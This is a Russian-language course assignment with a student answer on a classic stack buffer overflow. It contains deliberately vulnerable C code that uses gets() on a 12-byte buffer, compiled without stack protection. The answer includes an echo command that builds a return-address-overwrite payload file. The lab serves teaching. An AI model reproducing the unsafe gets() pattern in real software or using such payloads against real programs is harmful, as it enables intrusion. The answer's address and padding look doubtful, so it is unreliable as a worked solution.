## Задание 5 Функции

1) Переписать абонентский справочник с использованием функций
2) Имеется программа (исходный код которой приводится ниже,
компилировать с ключами: -fno-stack-protector -no-pie). Вам необходимо
произвести анализ программы с помощью отладчика для выяснения длины
массива для ввода пароля и адреса ветки условия проверки корректности
ввода пароля, которая выполняется при условии совпадения паролей.
Ввести пароль (строку символов)таким образом, чтобы перезаписать адрес
возврата на выясненный адрес (есть символы которые нельзя ввести с
клавиатуры, поэтому можно использовать перенаправление ввода(<) при
запуске программы).

```
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int IsPassOk(void);

int main(void){
    int PwStatus;
    puts("Enter password:");
    PwStatus = IsPassOk();
    if (PwStatus == 0) {
        printf("Bad password!\n");
        exit(1);
    } else {
        printf("Access granted!\n"); // Строка для которой нужно выяснить адрес
    }
return 0;}

int IsPassOk(void){
    char Pass[12];
    gets(Pass);
    return 0 == strcmp(Pass, "test");
}
```

## Ответ
1. Адрес возврата
![alt text](image-1.png)
2. Адрес строки "Access granted!" 0x402022
![alt text](<Screenshot from 2024-06-30 11-45-54.png>)
3. Адрес строки "Access granted!" это 0x402022. В формате little-endian это будет \x22\x20\x40\x00.
4. (echo -n -e "AAAAAAAAAAAA\x22\x20\x40\x00") > exploit.txt
5. ![alt text](image-2.png)